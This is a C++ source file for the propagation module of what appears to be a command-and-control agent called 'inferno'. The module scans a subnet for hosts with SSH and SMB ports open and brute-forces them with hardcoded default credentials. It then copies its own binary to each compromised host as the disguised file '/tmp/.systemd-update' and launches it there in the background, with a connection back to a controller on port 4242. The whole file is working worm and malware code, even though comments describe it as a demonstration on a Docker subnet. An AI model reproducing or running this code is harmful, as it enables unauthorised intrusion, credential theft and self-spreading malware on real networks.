#include "../include/Propagator.hpp"
#include "../include/ShellExecutor.hpp"
#include <sstream>
#include <cstdlib>
#if defined(__APPLE__)
#include <mach-o/dyld.h>
#include <limits.h>
#endif

namespace inferno {

Propagator::Result Propagator::execute(Command cmd, const std::string& target) {
    switch (cmd) {
        case Command::SCAN:
            return scan();
        case Command::BRUTE:
            return brute(target);
        case Command::DEPLOY:
            return deploy(target);
    }
    return {false, "Unknown command"};
}

Propagator::Result Propagator::scan() {
    ShellExecutor shell;
    std::stringstream output;

    // ARP scan on Docker subnet using standard system tools
    std::string cmd = "arp-scan " + std::string(DEFAULT_SUBNET) + " 2>/dev/null || "
                      "nmap -sn " + std::string(DEFAULT_SUBNET) + " 2>/dev/null || "
                      "ping -c 1 -W 1 172.17.0.1 2>/dev/null; "
                      "echo '---'; "
                      "arp -a 2>/dev/null || arp 2>/dev/null || true";

    ShellExecutor::Result result = shell.execute(cmd);

    // Port scan common ports on discovered hosts
    std::string port_scan = "for ip in $(arp -a 2>/dev/null | awk '{print $2}' | tr -d '()' || "
                            "echo '172.17.0.1'); do "
                            "  for port in 22 445; do "
                            "    nc -z -w 1 \"$ip\" \"$port\" 2>/dev/null && "
                            "    echo \"$ip:$port open\"; "
                            "  done; "
                            "done 2>/dev/null || true";

    ShellExecutor::Result ports = shell.execute(port_scan);

    output << result.output << "\n" << ports.output;
    return {result.success, output.str()};
}

Propagator::Result Propagator::brute(const std::string& target) {
    ShellExecutor shell;
    std::stringstream output;

    // Hardcoded credential pairs for demonstration
    const std::vector<std::pair<std::string, std::string>> creds = {
        {"root", "root"},
        {"root", "admin"},
        {"admin", "admin"},
        {"admin", "password"},
        {"user", "user"},
        {"test", "test"},
    };

    for (const auto& [user, pass] : creds) {
        // SSH brute
        {
            std::string cmd = "SSHPASS=" + pass + " sshpass -e ssh -o StrictHostKeyChecking=no "
                              "-o ConnectTimeout=3 " + user + "@" + target +
                              " 'id' 2>/dev/null";
            ShellExecutor::Result r = shell.execute(cmd);
            if (r.success) {
                output << "[SSH] " << user << ":" << pass << " @ " << target
                       << " — SUCCESS\n" << r.output << "\n";
                return {true, output.str()};
            }
        }

        // SMB brute
        {
            std::string cmd = "smbclient -L //" + target +
                              " -U " + user + "%" + pass +
                              " -N -t 3 2>/dev/null";
            ShellExecutor::Result r = shell.execute(cmd);
            if (r.success && r.output.find("NT_STATUS") == std::string::npos) {
                output << "[SMB] " << user << ":" << pass << " @ " << target
                       << " — SUCCESS\n" << r.output << "\n";
                return {true, output.str()};
            }
        }
    }

    output << "No valid credentials found for " << target;
    return {false, output.str()};
}

Propagator::Result Propagator::deploy(const std::string& target) {
    ShellExecutor shell;
    std::stringstream output;

    // Resolve own binary path for propagation
    std::string self_path;
#ifdef __linux__
    self_path = "/proc/self/exe";
#elif defined(__APPLE__)
    {
        char path_buf[PATH_MAX];
        uint32_t size = sizeof(path_buf);
        if (_NSGetExecutablePath(path_buf, &size) == 0) {
            char* resolved = realpath(path_buf, nullptr);
            if (resolved) {
                self_path = resolved;
                free(resolved);
            } else {
                self_path = path_buf;
            }
        }
    }
#else
    self_path = "inferno_client.exe";
#endif

    // Discover SSH credentials first
    Result brute_result = brute(target);
    if (!brute_result.success) {
        output << "Deploy failed: no credentials for " << target << "\n";
        return {false, output.str()};
    }

    // Extract username from brute output
    // Format: [SSH] user:pass @ target — SUCCESS
    std::string brute_out = brute_result.output;
    auto ssh_marker = brute_out.find("[SSH]");
    if (ssh_marker == std::string::npos) {
        output << "Deploy failed: no SSH credential found\n";
        return {false, output.str()};
    }

    // Parse user:pass from brute output
    std::string user, pass;
    auto colon = brute_out.find(':', ssh_marker + 5);
    auto space = brute_out.find(' ', colon + 1);
    user = brute_out.substr(ssh_marker + 5, colon - ssh_marker - 5);
    pass = brute_out.substr(colon + 1, space - colon - 1);

    // Upload agent via SCP
    {
        std::string cmd = "SSHPASS=" + pass + " sshpass -e scp -o StrictHostKeyChecking=no "
                          "-o ConnectTimeout=10 "
                          "\"" + self_path + "\" "
                          + user + "@" + target + ":/tmp/.systemd-update 2>/dev/null";
        ShellExecutor::Result r = shell.execute(cmd);
        output << "[SCP] " << (r.success ? "OK" : "FAILED") << "\n";
        if (!r.success) {
            return {false, output.str()};
        }
    }

    // Execute remotely via SSH
    {
        std::string server_ip = "127.0.0.1"; // placeholder — will be set by Agent
        std::string cmd = "SSHPASS=" + pass + " sshpass -e ssh -o StrictHostKeyChecking=no "
                          "-o ConnectTimeout=10 " + user + "@" + target +
                          " 'chmod +x /tmp/.systemd-update && "
                          "nohup /tmp/.systemd-update " + server_ip + " 4242 >/dev/null 2>&1 &' "
                          "2>/dev/null";
        ShellExecutor::Result r = shell.execute(cmd);
        output << "[SSH_EXEC] " << (r.success ? "OK" : "FAILED") << "\n";
        return {r.success, output.str()};
    }
}

} // namespace inferno
